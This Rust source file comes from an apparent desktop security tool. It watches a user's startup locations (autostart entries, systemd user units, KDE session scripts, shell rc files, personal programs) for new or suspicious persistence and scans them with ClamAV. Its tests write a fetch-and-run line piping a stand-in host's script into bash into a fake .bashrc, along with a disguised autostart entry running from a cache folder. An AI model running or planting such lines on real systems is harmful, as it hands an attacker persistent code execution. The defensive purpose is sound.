// SPDX-License-Identifier: GPL-3.0-or-later
// Copyright (C) 2026 Proton OS contributors

//! Watches the places where a program can set itself to start automatically ("persistence").
//!
//! Malware that gets onto a computer usually wants to survive a restart, and without
//! administrator rights the only way is through the user's own startup places: login
//! programs, background tasks for the account, KDE session scripts, the shell's startup files,
//! personal programs and app shortcuts. The tray (running as the user, see `tray.rs`) checks
//! these about every 30 seconds by size and date only; a file is read only when it changed.
//!
//! What it remembers is saved in `~/.local/share/proton-security/startup-baseline.json`, so a
//! change made while the tray wasn't running is still noticed at the next sign-in. Each new or
//! changed item is scanned with ClamAV, and the user is told when:
//! - a login program, account background task or KDE session script was added (or now runs
//!   something new), because these are rare and always worth a look; or
//! - a shell startup file, a personal program or an app shortcut gained something that looks
//!   like malware (see [`crate::risk::suspicious_line`]): those change often for normal
//!   reasons (installers add lines to `.bashrc`, apps add shortcuts), so only suspicious
//!   changes are reported.
//!
//! Limits (also in `docs/SECURITY-MODEL.md`): this notices common, opportunistic malware. A
//! program already running as the user can also edit the baseline or stop the tray, so it is
//! an early warning, not a barrier.

use crate::risk;
use crate::sys;
use crate::watchers::{enc_path, write_json};
use serde::{Deserialize, Serialize};
use std::collections::{HashMap, HashSet};
use std::path::{Path, PathBuf};
use std::time::UNIX_EPOCH;

/// What kind of startup place an item is in.
#[derive(Clone, Copy, PartialEq, Eq, Debug)]
pub enum Kind {
    /// `~/.config/autostart`: programs started when you sign in.
    Autostart,
    /// `~/.config/systemd/user`: background tasks for your account.
    Service,
    /// `~/.config/plasma-workspace/env` and `shutdown`: scripts KDE runs at sign-in / sign-out.
    Session,
    /// `.bashrc`, `.profile` and similar: run by every terminal or at sign-in.
    Shell,
    /// `~/.local/bin`: personal programs, found before system programs of the same name.
    Program,
    /// `~/.local/share/applications`: app shortcuts in the menu.
    Launcher,
}

/// One startup place to look at.
struct Place {
    /// A folder, or a single file (shell startup files).
    path: PathBuf,
    /// How deep to look in a folder.
    depth: usize,
    /// What kind of place it is.
    kind: Kind,
}

/// Most entries looked at per place (a launcher folder can have many shortcuts).
const MAX_ENTRIES: usize = 3000;
/// Files bigger than this aren't read line by line (only their size and date are compared).
const MAX_TEXT: u64 = 256 * 1024;

/// Every startup place for a home folder (`config` is `$XDG_CONFIG_HOME`, normally
/// `~/.config`).
fn places(home: &Path, config: &Path) -> Vec<Place> {
    let mut v = vec![
        Place {
            path: config.join("autostart"),
            depth: 1,
            kind: Kind::Autostart,
        },
        Place {
            path: config.join("systemd/user"),
            depth: 3,
            kind: Kind::Service,
        },
        Place {
            path: config.join("plasma-workspace/env"),
            depth: 1,
            kind: Kind::Session,
        },
        Place {
            path: config.join("plasma-workspace/shutdown"),
            depth: 1,
            kind: Kind::Session,
        },
        Place {
            path: home.join(".local/bin"),
            depth: 1,
            kind: Kind::Program,
        },
        Place {
            path: home.join(".local/share/applications"),
            depth: 2,
            kind: Kind::Launcher,
        },
    ];
    for f in [
        ".bashrc",
        ".profile",
        ".bash_profile",
        ".bash_login",
        ".bash_logout",
        ".zshrc",
        ".zprofile",
    ] {
        v.push(Place {
            path: home.join(f),
            depth: 0,
            kind: Kind::Shell,
        });
    }
    v
}

/// What is remembered about one item.
#[derive(Serialize, Deserialize, Clone, Debug, PartialEq, Default)]
#[serde(default)]
pub struct Entry {
    /// Size in bytes.
    pub size: u64,
    /// Modification time (nanoseconds since 1970).
    pub mtime: i64,
    /// For a symbolic link: where it points (see [`enc_path`]).
    pub link: Option<String>,
    /// Hashes of the file's lines ([`risk::fnv1a`]), sorted, for small text files. Lets a
    /// later check find which lines were added without storing the text itself.
    pub lines: Vec<u64>,
}

impl Entry {
    /// Same file as far as size, date and link target go (lines aren't compared).
    fn same_stat(&self, other: &Entry) -> bool {
        self.size == other.size && self.mtime == other.mtime && self.link == other.link
    }
}

/// Size, date and link target of a path, without reading it. `None` for anything that isn't a
/// regular file or a symbolic link.
fn stat(p: &Path) -> Option<Entry> {
    let md = std::fs::symlink_metadata(p).ok()?;
    let ft = md.file_type();
    if !ft.is_file() && !ft.is_symlink() {
        return None;
    }
    let mtime = md
        .modified()
        .ok()
        .and_then(|t| t.duration_since(UNIX_EPOCH).ok())
        .map(|d| d.as_nanos() as i64)
        .unwrap_or(0);
    let link = ft
        .is_symlink()
        .then(|| std::fs::read_link(p).ok().map(|t| enc_path(&t)))
        .flatten();
    Some(Entry {
        size: md.len(),
        mtime,
        link,
        lines: vec![],
    })
}

/// The text of a small regular file (not a link), for line comparison and heuristics.
fn text_of(p: &Path, e: &Entry) -> Option<String> {
    if e.link.is_some() || e.size > MAX_TEXT {
        return None;
    }
    risk::read_text_head(p)
}

/// Sorted, de-duplicated line hashes of a text.
fn line_hashes(text: &str) -> Vec<u64> {
    let mut v: Vec<u64> = text.lines().map(|l| risk::fnv1a(l.as_bytes())).collect();
    v.sort_unstable();
    v.dedup();
    v
}

/// A startup item that was added or changed.
#[derive(Clone, Debug)]
pub struct Change {
    /// The file (or link).
    pub path: PathBuf,
    /// What kind of place it is in.
    pub kind: Kind,
    /// New item (otherwise an existing one changed).
    pub added: bool,
    /// Name to show: an app shortcut's `Name=`, otherwise the file name.
    pub name: String,
    /// The program it runs, for `.desktop` files and units (file name only).
    pub runs: Option<String>,
    /// Why it looks suspicious, if it does.
    pub suspicious: Option<String>,
    /// Report it even without a threat or a suspicious line: a new sign-in program, background
    /// task or session script (these are rare and always worth a look).
    pub report: bool,
}

impl Change {
    /// Whether ClamAV should look at it (a regular file, not a link).
    pub fn scannable(&self) -> bool {
        std::fs::symlink_metadata(&self.path).is_ok_and(|m| m.is_file())
    }

    /// Notification title and text, when it is worth telling the user about. `threat` is the
    /// virus name if ClamAV found one.
    pub fn message(&self, threat: Option<&str>) -> Option<(String, String)> {
        let name = &self.name;
        let runs = self
            .runs
            .as_ref()
            .map(|r| format!(" (runs {r})"))
            .unwrap_or_default();
        if let Some(sig) = threat {
            return Some((
                "Threat found in a startup item".into(),
                format!(
                    "\"{name}\" is dangerous ({sig}) and is set to run automatically. Open Proton Security to quarantine or delete it, then run a full scan."
                ),
            ));
        }
        if let Some(why) = &self.suspicious {
            let what = match self.kind {
                Kind::Shell => format!("A line was added to {name} that {why}"),
                Kind::Program => {
                    format!("The new program \"{name}\" in your personal programs folder {why}")
                }
                Kind::Launcher => format!("The app shortcut \"{name}\"{runs} {why}"),
                Kind::Autostart => format!("The sign-in program \"{name}\"{runs} {why}"),
                Kind::Service => format!("The background task \"{name}\"{runs} {why}"),
                Kind::Session => format!("The sign-in script \"{name}\" {why}"),
            };
            return Some((
                "Suspicious startup change".into(),
                format!("{what}. If you didn't do this, run a full scan in Proton Security."),
            ));
        }
        if !self.report {
            return None;
        }
        let verb = if self.added { "was set" } else { "was changed" };
        let body = match self.kind {
            Kind::Autostart => format!(
                "\"{name}\"{runs} {verb} to start automatically when you sign in. If you didn't do this, remove it in System Settings → Autostart and run a full scan in Proton Security."
            ),
            Kind::Service => format!(
                "A background task \"{name}\"{runs} {} for your account. If you didn't set it up, run a full scan in Proton Security.",
                if self.added {
                    "was added"
                } else {
                    "was changed"
                }
            ),
            _ => format!(
                "The script \"{name}\" {} that runs every time you sign in or out. If you didn't do this, remove it and run a full scan in Proton Security.",
                if self.added {
                    "was added"
                } else {
                    "was changed"
                }
            ),
        };
        Some(("A new program was set to start automatically".into(), body))
    }
}

/// The interesting keys of a `.desktop` file.
#[derive(Default, Debug)]
struct DesktopInfo {
    /// `Name=`.
    name: Option<String>,
    /// `Exec=`.
    exec: Option<String>,
    /// `Hidden=true` or `X-GNOME-Autostart-enabled=false`: switched off.
    disabled: bool,
}

/// Read the main group of a `.desktop` file.
fn desktop_info(text: &str) -> DesktopInfo {
    let mut d = DesktopInfo::default();
    let mut in_main = false;
    for l in text.lines() {
        let l = l.trim();
        if l.starts_with('[') {
            in_main = l == "[Desktop Entry]";
            continue;
        }
        if !in_main {
            continue;
        }
        if let Some(v) = l.strip_prefix("Name=") {
            d.name.get_or_insert_with(|| v.to_string());
        } else if let Some(v) = l.strip_prefix("Exec=") {
            d.exec.get_or_insert_with(|| v.to_string());
        } else if l.eq_ignore_ascii_case("Hidden=true")
            || l.eq_ignore_ascii_case("X-GNOME-Autostart-enabled=false")
        {
            d.disabled = true;
        }
    }
    d
}

/// `ExecStart=` of a systemd unit file.
fn unit_exec(text: &str) -> Option<String> {
    text.lines()
        .map(str::trim)
        .find_map(|l| l.strip_prefix("ExecStart="))
        .map(|v| v.trim_start_matches(['-', '@', '+', '!', ':']).to_string())
}

/// The program file name of a command line ("/home/a/.x/run --flag" → "run").
fn program_of(cmd: &str) -> Option<String> {
    let cmd = cmd.trim_start();
    // A quoted program path may contain spaces: "/opt/My App/run" --flag.
    let first = match cmd.strip_prefix(['"', '\'']) {
        Some(rest) => rest.split(['"', '\'']).next()?,
        None => cmd.split_whitespace().next()?,
    };
    let name = Path::new(first).file_name()?.to_string_lossy().into_owned();
    Some(short(&name))
}

/// Shorten text for a notification (60 characters, no control characters).
fn short(s: &str) -> String {
    let clean: String = s
        .chars()
        .map(|c| if c.is_control() { '?' } else { c })
        .collect();
    if clean.chars().count() > 60 {
        clean.chars().take(59).collect::<String>() + "…"
    } else {
        clean
    }
}

/// Why a command line from a `.desktop` file or unit looks suspicious: the shell heuristics,
/// or running a program from Downloads or a settings/cache folder (normal apps live in system
/// folders, `~/.local` or `/opt`).
fn suspicious_exec(cmd: &str, home: &Path, downloads: &Path) -> Option<String> {
    if let Some(why) = risk::suspicious_line(cmd) {
        return Some(why.into());
    }
    let dl = downloads.to_string_lossy();
    if !dl.is_empty() && cmd.contains(dl.as_ref()) {
        return Some("runs a program from your Downloads folder".into());
    }
    for d in [".cache/", ".config/"] {
        let full = format!("{}/{d}", home.to_string_lossy());
        if cmd.contains(&full)
            || cmd.contains(&format!("~/{d}"))
            || cmd.contains(&format!("$HOME/{d}"))
        {
            return Some("runs a program hidden in a settings or cache folder".into());
        }
    }
    None
}

/// Remembers the startup places and reports what changed.
pub struct StartupWatcher {
    /// The home folder being watched.
    home: PathBuf,
    /// `$XDG_CONFIG_HOME`.
    config: PathBuf,
    /// The Downloads folder (for the "runs from Downloads" check).
    downloads: PathBuf,
    /// Where the baseline is saved.
    file: PathBuf,
    /// Item (see [`enc_path`]) -> what it was like when last accepted.
    base: HashMap<String, Entry>,
    /// Changed item -> (state when first seen changed, polls it stayed the same).
    pending: HashMap<String, (Entry, u32)>,
}

/// The saved baseline.
#[derive(Serialize, Deserialize, Default)]
#[serde(default)]
struct Saved {
    /// Format version, for future changes.
    version: u32,
    /// Item -> state.
    items: HashMap<String, Entry>,
}

impl StartupWatcher {
    /// Watch the current user's startup places, with the baseline in the data folder.
    pub fn new() -> Self {
        let config = std::env::var_os("XDG_CONFIG_HOME")
            .map(PathBuf::from)
            .filter(|p| p.is_absolute())
            .unwrap_or_else(|| sys::home().join(".config"));
        Self::with(
            sys::home(),
            config,
            crate::watchers::downloads_dir(),
            sys::data_dir().join("startup-baseline.json"),
        )
    }

    /// Watch a given home folder (also used by the tests). Without a saved baseline, what is
    /// there now becomes the baseline (nothing is reported the first time).
    pub fn with(home: PathBuf, config: PathBuf, downloads: PathBuf, file: PathBuf) -> Self {
        let mut w = Self {
            home,
            config,
            downloads,
            file,
            base: HashMap::new(),
            pending: HashMap::new(),
        };
        let saved: Option<Saved> = sys::read(&w.file).and_then(|s| serde_json::from_str(&s).ok());
        match saved {
            Some(s) => w.base = s.items,
            None => {
                for (k, (p, _)) in w.scan() {
                    if let Some(mut e) = stat(&p) {
                        if let Some(t) = text_of(&p, &e) {
                            e.lines = line_hashes(&t);
                        }
                        w.base.insert(k, e);
                    }
                }
                w.save();
            }
        }
        w
    }

    /// Save the baseline.
    fn save(&self) {
        write_json(
            &self.file,
            &Saved {
                version: 1,
                items: self.base.clone(),
            },
        );
    }

    /// Every item in every startup place: key -> (path, kind).
    fn scan(&self) -> HashMap<String, (PathBuf, Kind)> {
        let mut m = HashMap::new();
        for pl in places(&self.home, &self.config) {
            if pl.depth == 0 {
                if stat(&pl.path).is_some() {
                    m.insert(enc_path(&pl.path), (pl.path.clone(), pl.kind));
                }
                continue;
            }
            for e in walkdir::WalkDir::new(&pl.path)
                .min_depth(1)
                .max_depth(pl.depth)
                .follow_links(false)
                .into_iter()
                .take(MAX_ENTRIES)
                .flatten()
            {
                let ft = e.file_type();
                if ft.is_file() || ft.is_symlink() {
                    m.insert(enc_path(e.path()), (e.into_path(), pl.kind));
                }
            }
        }
        m
    }

    /// Call every 30 seconds or so. Returns items that were added or changed and have stopped
    /// changing; they are accepted into the baseline right away (each change is reported
    /// once). Removed items are forgotten silently.
    pub fn poll(&mut self) -> Vec<Change> {
        let now = self.scan();
        let mut current: HashMap<String, Entry> = HashMap::new();
        for (k, (p, _)) in &now {
            if let Some(e) = stat(p) {
                current.insert(k.clone(), e);
            }
        }
        // Track changed items until they hold still for one poll.
        for (k, e) in &current {
            if self.base.get(k).is_some_and(|b| b.same_stat(e)) {
                self.pending.remove(k);
                continue;
            }
            match self.pending.get_mut(k) {
                Some((prev, n)) if prev.same_stat(e) => *n += 1,
                Some((prev, n)) => {
                    *prev = e.clone();
                    *n = 0;
                }
                None => {
                    self.pending.insert(k.clone(), (e.clone(), 0));
                }
            }
        }
        self.pending.retain(|k, _| current.contains_key(k));
        let ready: Vec<String> = self
            .pending
            .iter()
            .filter(|(_, (_, n))| *n >= 1)
            .map(|(k, _)| k.clone())
            .collect();

        let mut changes = vec![];
        let mut dirty = false;
        for k in ready {
            let Some((mut e, _)) = self.pending.remove(&k) else {
                continue;
            };
            let (path, kind) = now[&k].clone();
            let old = self.base.get(&k).cloned();
            let text = text_of(&path, &e);
            if let Some(t) = &text {
                e.lines = line_hashes(t);
            }
            // Lines that weren't there before (all lines for a new file).
            let old_lines: HashSet<u64> = old
                .as_ref()
                .map(|o| o.lines.iter().copied().collect())
                .unwrap_or_default();
            let added_text: Vec<&str> = text
                .as_deref()
                .map(|t| {
                    t.lines()
                        .filter(|l| !old_lines.contains(&risk::fnv1a(l.as_bytes())))
                        .collect()
                })
                .unwrap_or_default();
            let unchanged_content = old.is_some()
                && text.is_some()
                && added_text.is_empty()
                && old.as_ref().is_some_and(|o| o.link == e.link);
            self.base.insert(k, e);
            dirty = true;
            if unchanged_content {
                // Saved again, or lines removed: nothing new can run.
                continue;
            }
            if let Some(c) = self.describe(&path, kind, old.is_none(), &added_text) {
                changes.push(c);
            }
        }
        let before = self.base.len();
        self.base.retain(|k, _| current.contains_key(k));
        if dirty || self.base.len() != before {
            self.save();
        }
        changes
    }

    /// Work out what a changed item means. `added_text` holds its new lines.
    fn describe(
        &self,
        path: &Path,
        kind: Kind,
        added: bool,
        added_text: &[&str],
    ) -> Option<Change> {
        let file_name = path
            .file_name()
            .map(|n| short(&n.to_string_lossy()))
            .unwrap_or_default();
        let is_desktop = path.extension().is_some_and(|x| x == "desktop");
        let full_text = if is_desktop || kind == Kind::Service {
            risk::read_text_head(path)
        } else {
            None
        };
        let mut c = Change {
            path: path.to_path_buf(),
            kind,
            added,
            name: file_name.clone(),
            runs: None,
            suspicious: None,
            report: false,
        };
        let new_text = added_text.join("\n");
        match kind {
            Kind::Autostart | Kind::Launcher if is_desktop => {
                let d = desktop_info(full_text.as_deref().unwrap_or(""));
                if let Some(n) = &d.name {
                    c.name = short(n);
                }
                c.runs = d.exec.as_deref().and_then(program_of);
                // Our own tray, or a sign-in program that was switched off: nothing to say.
                let ours = d
                    .exec
                    .as_deref()
                    .is_some_and(|e| e.contains("proton-security"));
                if d.disabled || ours {
                    return None;
                }
                c.suspicious = d
                    .exec
                    .as_deref()
                    .and_then(|e| suspicious_exec(e, &self.home, &self.downloads));
                // A sign-in program that is new or now runs something else.
                c.report = kind == Kind::Autostart
                    && (added
                        || added_text
                            .iter()
                            .any(|l| l.trim_start().starts_with("Exec")));
            }
            Kind::Service => {
                let link = std::fs::read_link(path).ok();
                if let Some(target) = link {
                    // `systemctl --user enable`: a link in a *.wants folder.
                    c.runs = target.file_name().map(|n| short(&n.to_string_lossy()));
                    c.report = added;
                } else {
                    let exec = full_text.as_deref().and_then(unit_exec);
                    c.runs = exec.as_deref().and_then(program_of);
                    c.suspicious = exec
                        .as_deref()
                        .and_then(|e| suspicious_exec(e, &self.home, &self.downloads));
                    c.report = added
                        || added_text
                            .iter()
                            .any(|l| l.trim_start().starts_with("Exec"));
                }
            }
            Kind::Session => {
                c.suspicious = risk::suspicious_text(&new_text).map(String::from);
                c.report = added
                    || added_text
                        .iter()
                        .any(|l| !l.trim().is_empty() && !l.trim_start().starts_with('#'));
            }
            Kind::Shell => {
                c.suspicious = risk::suspicious_text(&new_text).map(String::from);
            }
            Kind::Program => {
                // Scripts are read; programs (binaries) are left to ClamAV.
                c.suspicious = risk::suspicious_text(&new_text).map(String::from);
            }
            Kind::Autostart | Kind::Launcher => {
                // Not a .desktop file: a script dropped into autostart still runs at sign-in.
                c.suspicious = risk::suspicious_text(&new_text).map(String::from);
                c.report = kind == Kind::Autostart && added;
            }
        }
        Some(c)
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    /// A fresh fake home folder.
    fn home(tag: &str) -> PathBuf {
        let d = std::env::temp_dir().join(format!("ps-startup-{tag}-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&d);
        std::fs::create_dir_all(d.join(".config/autostart")).unwrap();
        std::fs::create_dir_all(d.join(".local/bin")).unwrap();
        d
    }

    /// Poll until changes settle (each change needs two polls), with a pause so modification
    /// times differ.
    fn settle(w: &mut StartupWatcher) -> Vec<Change> {
        let mut all = w.poll();
        all.extend(w.poll());
        all
    }

    fn watcher(h: &Path) -> StartupWatcher {
        StartupWatcher::with(
            h.to_path_buf(),
            h.join(".config"),
            h.join("Downloads"),
            h.join("baseline.json"),
        )
    }

    #[test]
    fn reports_new_autostart_and_suspicious_bashrc() {
        let h = home("a");
        std::fs::write(h.join(".bashrc"), "alias ll='ls -l'\n").unwrap();
        // Existing items become the baseline: nothing reported.
        let mut w = watcher(&h);
        assert!(settle(&mut w).is_empty());

        std::fs::write(
            h.join(".config/autostart/updater.desktop"),
            "[Desktop Entry]\nName=System Updater\nExec=/home/x/.cache/upd --quiet\nType=Application\n",
        )
        .unwrap();
        std::thread::sleep(std::time::Duration::from_millis(20));
        std::fs::write(
            h.join(".bashrc"),
            "alias ll='ls -l'\ncurl -s http://evil.example/p | bash\n",
        )
        .unwrap();
        let ch = settle(&mut w);
        let auto = ch.iter().find(|c| c.kind == Kind::Autostart).unwrap();
        assert!(auto.added && auto.report);
        assert_eq!(auto.name, "System Updater");
        assert_eq!(auto.runs.as_deref(), Some("upd"));
        assert!(auto.message(None).is_some());
        let rc = ch.iter().find(|c| c.kind == Kind::Shell).unwrap();
        assert!(rc.suspicious.is_some());

        // The baseline was saved: a new watcher reports nothing more.
        let mut w2 = watcher(&h);
        assert!(settle(&mut w2).is_empty());
        let _ = std::fs::remove_dir_all(&h);
    }

    #[test]
    fn ordinary_changes_stay_quiet() {
        let h = home("b");
        std::fs::write(h.join(".bashrc"), "alias ll='ls -l'\n").unwrap();
        let mut w = watcher(&h);
        std::fs::write(
            h.join(".bashrc"),
            "alias ll='ls -l'\n. \"$HOME/.cargo/env\"\n",
        )
        .unwrap();
        std::fs::write(
            h.join(".local/bin/tool"),
            "#!/usr/bin/python3\nfrom tool import main\nmain()\n",
        )
        .unwrap();
        // The user switching off a sign-in program (KDE writes Hidden=true).
        std::fs::write(
            h.join(".config/autostart/app.desktop"),
            "[Desktop Entry]\nName=App\nExec=app\nHidden=true\n",
        )
        .unwrap();
        let ch = settle(&mut w);
        assert!(ch.iter().all(|c| c.message(None).is_none()), "{ch:?}");
        // A threat is always reported.
        let any = ch.first().unwrap();
        assert!(any.message(Some("Eicar-Signature")).is_some());
        let _ = std::fs::remove_dir_all(&h);
    }

    #[test]
    fn desktop_parsing() {
        let d = desktop_info(
            "[Desktop Entry]\nName=A\nExec=a %u\n[Desktop Action x]\nName=B\nExec=b\n",
        );
        assert_eq!(d.name.as_deref(), Some("A"));
        assert_eq!(d.exec.as_deref(), Some("a %u"));
        assert_eq!(
            unit_exec("[Service]\nExecStart=-/usr/bin/foo --x\n").as_deref(),
            Some("/usr/bin/foo --x")
        );
        assert_eq!(program_of("\"/opt/My App/run\" x").as_deref(), Some("run"));
    }
}
